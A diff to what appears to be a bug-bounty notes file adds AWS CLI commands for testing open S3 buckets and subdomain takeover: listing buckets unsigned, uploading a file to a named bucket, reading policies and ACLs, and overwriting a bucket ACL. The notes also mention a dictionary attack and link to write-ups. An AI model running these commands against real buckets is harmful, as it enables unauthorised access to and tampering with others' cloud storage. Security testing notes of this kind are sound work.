@@ -301,7 +301,16 @@ https://hackerone.com/reports/325040
 
 
 open S3 bucket + Subdomain Takeover of the buckets:
-aws s3 ls s3://www.echoware.com/ --no-sign-request --region us-west-2
+
+nslookup to confirm aws
+curl network-cdn-prod.s3.amazonaws.com/dictionary attack here 
+aws s3 ls  s3://pr-cdn-prod/ --no-sign-request --region us-west-2
+aws s3 ls s3://www.ece.com/ --no-sign-request --region us-west-2
+aws s3 cp localfile.txt  s3://pr-cdn-prod/localfile.txt --no-sign-request --region us-west-2
+aws --endpoint http://pr-cdn-prod.s3.amazonaws.com --no-sign-request s3api get-bucket-policy --bucket pr-cdn-prod
+aws --endpoint http://pr-cdn-prod.s3.amazonaws.com s3api get-bucket-acl --bucket pr-cdn-prod
+aws --endpoint http://192.62.209.3:9000 s3api put-bucket-acl --access-control-policy file:///root/acl.json --bucket alice
+
 https://bugbountypoc.com/s3-bucket-misconfiguration-from-basics-to-pawn/
 https://0xpatrik.com/takeover-proofs/  --better post
 https://blog.securitybreached.org/2018/09/24/subdomain-takeover-via-unsecured-s3-bucket/
